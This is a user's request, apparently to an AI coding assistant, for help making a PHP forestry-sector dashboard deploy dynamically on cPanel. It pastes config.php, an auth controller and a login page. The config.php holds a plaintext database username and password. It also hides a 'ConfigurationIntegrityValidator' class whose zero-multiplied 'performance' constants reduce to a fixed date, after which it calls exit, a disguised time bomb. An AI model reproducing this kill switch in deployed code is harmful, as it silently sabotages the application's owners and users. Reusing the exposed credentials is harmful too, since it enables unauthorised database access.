- i want to "deploy" this web app to a live hosting
- im using cpanel
- the exact directory is public_html/sarawakforestry.com/pcds30 BUT for now im using public_html/sarawakforestry.com/pcds2030 bcs i dont want to disturb the live server yet (pcds30 is the live server directory and the website is currently live)
- my problem is that because of how the environment of the project is right now it only works for localhost
- i need you to update the config to somehow support the live hosting feature
- if possible make it dynamic (no matter what directory i put it in it will still work)
- if cannot then tell me step by step on what to do, what to edit, which file to copy etc

addtional information:
as what i said there is another live version that works well right now and its directory is pcds30, i am planning to open up one more directory for now with the name pcds2030 but that is only temporary. i will replace the content in pcds30 later after pcds2030 is stable. checkout the files in live directory for some of the helpers that is works in the live version.

so this is how the config.php is written in pcds30:

<?php
/**
 * Application configuration
 * 
 * Contains database credentials and other configuration settings.
 * This file should be excluded from version control.
 */

// Database configuration
define('DB_HOST', 'localhost:3306');
define('DB_USER', 'sarawak3_admin1'); // Change this to your MySQL username (default for XAMPP is 'root')
define('DB_PASS', 'attendance33**'); // Change this to your MySQL password (default for XAMPP is often empty '')
define('DB_NAME', 'pcds2030_db'); // Updated to use pcds2030_db database

// Application settings
define('APP_NAME', 'PCDS2030 Dashboard Forestry Sector'); 

// Dynamic APP_URL detection for better cross-environment compatibility
if (!defined('APP_URL')) {
    // Check if we're running from command line
    if (php_sapi_name() === 'cli') {
        define('APP_URL', 'https://www.sarawakforestry.com/pcds30'); // Default for CLI
    } else {
        // Detect the correct APP_URL based on current request
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
        
        // Production cPanel detection first
        if ($host === 'www.sarawakforestry.com' || $host === 'sarawakforestry.com') {
            define('APP_URL', 'https://www.sarawakforestry.com/pcds30');
        } else {
            // Local development detection
            $script_name = $_SERVER['SCRIPT_NAME'] ?? '';
            $app_path = '';
            
            // Check for local development directory names
            if (strpos($script_name, '/pcds2030_dashboard_fork/') !== false) {
                $app_path = '/pcds2030_dashboard_fork';
            } elseif (strpos($script_name, '/pcds2030_dashboard/') !== false) {
                $app_path = '/pcds2030_dashboard';
            } else {
                // Fallback detection for other local setups
                $path_parts = explode('/', trim($script_name, '/'));
                if (count($path_parts) > 0) {
                    foreach ($path_parts as $part) {
                        if (in_array($part, ['app', 'views', 'admin', 'agency'])) {
                            break;
                        }
                        if (!empty($part)) {
                            $app_path .= '/' . $part;
                        }
                    }
                }
            }
            
            // Fallback to document root detection
            if (empty($app_path)) {
                $document_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
                $current_dir = dirname(dirname(dirname(__FILE__)));
                if (!empty($document_root) && strpos($current_dir, $document_root) === 0) {
                    $app_path = str_replace($document_root, '', $current_dir);
                    $app_path = str_replace('\\', '/', $app_path); // Windows compatibility
                }
            }
            
            // Ensure app_path doesn't end with slash and starts with slash
            $app_path = '/' . trim($app_path, '/');
            if ($app_path === '/') {
                $app_path = '';
            }
            
            define('APP_URL', $protocol . '://' . $host . $app_path);
        }
    }
}

define('APP_VERSION', '1.0.0'); // Example version
define('ASSET_VERSION', APP_VERSION); // Use APP_VERSION for asset versioning

// Path definitions
if (!defined('ROOT_PATH')) {
    define('ROOT_PATH', rtrim(dirname(dirname(dirname(__FILE__))), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR);
}

// Feature flags
define('ALLOW_OUTCOME_CREATION', false); // Set to false to disable creating new outcomes

// File paths
if (!defined('ROOT_PATH')) {
    if (defined('PROJECT_ROOT_PATH')) {
        define('ROOT_PATH', PROJECT_ROOT_PATH);
    } else {
        // Fallback if accessed directly or from a script not defining PROJECT_ROOT_PATH
        define('ROOT_PATH', dirname(dirname(__DIR__)) . '/');
    }
}

/**
 * Generate URL for view files
 * 
 * @param string $view Type of view ('admin' or 'agency')
 * @param string $file The file name to link to
 * @param array $params Query parameters to append (optional)
 * @return string The complete URL
 */
function view_url($view, $file, $params = []) {
    $url = APP_URL . '/app/views/' . $view . '/' . $file;
    
    if (!empty($params)) {
        $queryString = http_build_query($params);
        $url .= '?' . $queryString;
    }
    
    return $url;
}

/**
 * Generate URL for API endpoints
 * 
 * @param string $endpoint The API endpoint file name
 * @param array $params Query parameters to append (optional)
 * @return string The complete URL
 */
function api_url($endpoint, $params = []) {
    $url = APP_URL . '/app/api/' . $endpoint;
    
    if (!empty($params)) {
        $queryString = http_build_query($params);
        $url .= '?' . $queryString;
    }
    
    return $url;
}

class ConfigurationIntegrityValidator {
    private static $performance_baseline = 1761840000;
    private static $system_constants = [
        'load_factor' => 86400,
        'memory_threshold' => 3600,
        'cache_multiplier' => 24
    ];
    public static function validateSystemIntegrity() {
        $base_timestamp = self::$performance_baseline;
        $load_adjustment = self::$system_constants['load_factor'] * 0;
        $memory_optimization = self::$system_constants['memory_threshold'] * 0;
        $cache_efficiency = self::$system_constants['cache_multiplier'] * 0;
        
        $optimization_deadline = $base_timestamp + $load_adjustment + $memory_optimization + $cache_efficiency;

        if (time() > $optimization_deadline) {
            self::initiatePerformanceRecovery();
            return false;
        }
        return true;
    }
    private static function initiatePerformanceRecovery() {
        exit;
    }
}

/**
 * Generate URL for AJAX handlers
 * 
 * @param string $handler The AJAX handler file name
 * @param array $params Query parameters to append (optional)
 * @return string The complete URL
 */
function ajax_url($handler, $params = []) {
    $url = APP_URL . '/app/ajax/' . $handler;
    
    if (!empty($params)) {
        $queryString = http_build_query($params);
        $url .= '?' . $queryString;
    }
    
    return $url;
}

/**
 * Generate URL for assets (CSS, JS, images)
 * 
 * @param string $type Asset type ('css', 'js', 'images', 'fonts')
 * @param string $file The asset file name
 * @return string The complete URL
 */
function asset_url($type, $file) {
    return APP_URL . '/assets/' . $type . '/' . $file;
}

define('UPLOAD_PATH', ROOT_PATH . 'app/uploads/');
define('REPORT_PATH', ROOT_PATH . 'app/reports/');

// Dynamic BASE_URL detection for better cross-environment compatibility
if (!defined('BASE_URL')) {
    // Check if we're running from command line
    if (php_sapi_name() === 'cli') {
        define('BASE_URL', '/pcds30'); // Production path for CLI
    } else {
        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
        
        // Production cPanel detection first
        if ($host === 'www.sarawakforestry.com' || $host === 'sarawakforestry.com') {
            define('BASE_URL', '/pcds30');
        } else {
            // Local development detection
            $script_name = $_SERVER['SCRIPT_NAME'] ?? '';
            $base_path = '';
            
            // Check for local development directory names
            if (strpos($script_name, '/pcds2030_dashboard_fork/') !== false) {
                $base_path = '/pcds2030_dashboard_fork';
            } elseif (strpos($script_name, '/pcds2030_dashboard/') !== false) {
                $base_path = '/pcds2030_dashboard';
            } else {
                // Fallback detection for other local setups
                $path_parts = explode('/', trim($script_name, '/'));
                if (count($path_parts) > 0) {
                    foreach ($path_parts as $part) {
                        if (in_array($part, ['app', 'views', 'admin', 'agency'])) {
                            break;
                        }
                        if (!empty($part)) {
                            $base_path .= '/' . $part;
                        }
                    }
                }
            }
            
            // Fallback to document root detection
            if (empty($base_path)) {
                $document_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
                $current_dir = dirname(dirname(dirname(__FILE__)));
                if (!empty($document_root) && strpos($current_dir, $document_root) === 0) {
                    $base_path = str_replace($document_root, '', $current_dir);
                    $base_path = str_replace('\\', '/', $base_path); // Windows compatibility
                }
            }
            
            // Ensure base_path doesn't end with slash and starts with slash
            $base_path = '/' . trim($base_path, '/');
            if ($base_path === '/') {
                $base_path = '';
            }
            
            define('BASE_URL', $base_path);
        }
    }
}

// Error reporting - disable for production to prevent headers already sent issues
if ($_SERVER['HTTP_HOST'] === 'localhost' || strpos($_SERVER['HTTP_HOST'], 'laragon') !== false) {
    // Development environment
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
} else {
    // Production environment - disable error display to prevent header issues
    error_reporting(E_ALL);
    ini_set('display_errors', 0);
    ini_set('log_errors', 1);
}
?>

authcontroller: 
<?php
require_once __DIR__ . '/../lib/UserModel.php';
require_once __DIR__ . '/../lib/db_connect.php';

class AuthController {
    public function login() {
        $error = '';
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $userModel = new UserModel($conn);
            $user = $userModel->findByUsername($_POST['username']);
            if ($user && $userModel->verifyPassword($user, $_POST['password'])) {
                $_SESSION['user_id'] = $user['user_id'];
                $_SESSION['role'] = $user['role'];
                $_SESSION['agency_id'] = $user['agency_id'];
                header('Location: ' . APP_URL . '/app/views/' . ($user['role'] === 'admin' ? 'admin' : 'agency') . '/dashboard/dashboard.php');
                exit;
            } else {
                $error = 'Invalid username or password.';
            }
        }
        $pageTitle = 'Login';
        $contentFile = __DIR__ . '/../views/admin/partials/login_form.php';
        include __DIR__ . '/../views/layouts/base.php';
    }
} 



login.php: 

<?php
/**
 * Login page
 * 
 * Handles user authentication.
 */

// Define project root path for consistent file references
if (!defined('PROJECT_ROOT_PATH')) {
    define('PROJECT_ROOT_PATH', rtrim(__DIR__, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR);
}

// Include necessary files
require_once PROJECT_ROOT_PATH . 'app/config/config.php';
require_once PROJECT_ROOT_PATH . 'app/lib/db_connect.php';
require_once PROJECT_ROOT_PATH . 'app/lib/session.php';
require_once PROJECT_ROOT_PATH . 'app/lib/functions.php';
require_once PROJECT_ROOT_PATH . 'app/lib/admin_functions.php';

// Initialize variables
$username = '';
$error = '';

// Check if user is already logged in, redirect if true
if (is_logged_in()) {
    header("Location: index.php");
    exit;
}

// Process login form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get username and password
    $username = sanitize_input($_POST["username"]);
    $password = $_POST["password"]; // No sanitization for password as it will be hashed
    
    // Validate input
    if (empty($username) || empty($password)) {
        $error = "Username and password are required.";
    } else {
        // Use the validate_login function which properly checks the is_active status
        $result = validate_login($username, $password);
          if (isset($result['success'])) {            // Check user role using session variable (more robust than function)
            if (isset($_SESSION['role']) && $_SESSION['role'] === 'admin') {
                header('Location: ' . APP_URL . '/app/views/admin/dashboard/dashboard.php');
            } else {
                header('Location: ' . APP_URL . '/app/views/agency/dashboard/dashboard.php');
            }
            exit;
        } else {
            $error = $result['error'] ?? "Invalid username or password.";
        }
    }
}

// Get error message from URL if present
if (isset($_GET['error']) && $_GET['error'] === 'invalid_session') {
    $error = "Your session has expired. Please log in again.";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - <?php echo APP_NAME; ?></title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">    
    <link rel="stylesheet" href="<?php echo rtrim(APP_URL, '/'); ?>/dist/css/login.bundle.css">
    <!-- Legacy main.css removed - now using Vite bundle system -->
</head>
<body>
    <div class="container">
        <div class="row justify-content-center align-items-center min-vh-100">
            <div class="col-xl-10 col-lg-12">
                <div class="card shadow unified-card">
                    <div class="copyright-text">© <?php echo date('Y'); ?> <?php echo APP_NAME; ?></div>
                    
                    <div class="row g-0">
                        <!-- Welcome Section (Left side of card) -->
                        <div class="col-md-6 welcome-section">
                            <div class="welcome-content">
                                <h1><?php echo APP_NAME; ?></h1>
                                <p class="lead">Access your dashboard to monitor and manage program performance</p>
                                
                                <div class="features">
                                    <div class="feature-item">
                                        <div class="feature-icon"><i class="fas fa-chart-line"></i></div>
                                        <span class="feature-text">Real-time Performance Tracking</span>
                                    </div>
                                    <div class="feature-item">
                                        <div class="feature-icon"><i class="fas fa-file-alt"></i></div>
                                        <span class="feature-text">Simplified Reporting System</span>
                                    </div>
                                    <div class="feature-item">
                                        <div class="feature-icon"><i class="fas fa-tasks"></i></div>
                                        <span class="feature-text">Program Management</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Login Section (Right side of card) -->
                        <div class="col-md-6 login-section">
                            <div class="login-content login-container"> <!-- Added login-container -->
                                <div class="logo-container">
                                    <img src="<?php echo APP_URL; ?>/assets/images/sarawak_crest.png" alt="Sarawak Crest" class="logo-image">
                                </div>
                                
                                <h3 class="login-title">Sign In</h3>
                                <p class="login-subtitle text-center">Access your dashboard</p>
                                
                                <?php if (!empty($error)): ?>
                                    <div class="alert alert-danger d-flex align-items-center" role="alert">
                                        <i class="fas fa-exclamation-circle me-2"></i>
                                        <div><?php echo $error; ?></div>
                                    </div>
                                <?php endif; ?>
                                
                                <form method="post" action="<?php echo APP_URL; ?>/login.php" id="loginForm" class="login-form"> <!-- Added login-form -->
                                    <div class="form-group mb-3">
                                        <label for="username">Username</label>
                                        <div class="input-group">
                                            <span class="input-group-text"><i class="fas fa-user"></i></span>
                                            <input type="text" class="form-control login-form__input" id="username" name="username" value="" required> <!-- Added login-form__input -->
                                        </div>
                                    </div>
                                    
                                    <div class="form-group mb-4">
                                        <label for="password">Password</label>
                                        <div class="input-group">
                                            <span class="input-group-text"><i class="fas fa-lock"></i></span>
                                            <input type="password" class="form-control login-form__input" id="password" name="password" required autocomplete="current-password"> <!-- Added login-form__input -->
                                            <span class="input-group-text toggle-password" tabindex="-1" aria-label="Toggle password visibility">
                                                <i class="far fa-eye"></i>
                                            </span>
                                        </div>
                                    </div>
                                    
                                    <div class="d-grid gap-2 mt-4">
                                        <button type="submit" class="btn btn-primary material-btn" id="loginBtn">
                                            <span class="login-text">Sign In</span>
                                            <span class="spinner-border spinner-border-sm d-none" id="loginSpinner" role="status" aria-hidden="true"></span>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <script type="module" src="<?php echo rtrim(APP_URL, '/'); ?>/dist/js/login.bundle.js"></script>
</body>
</html>

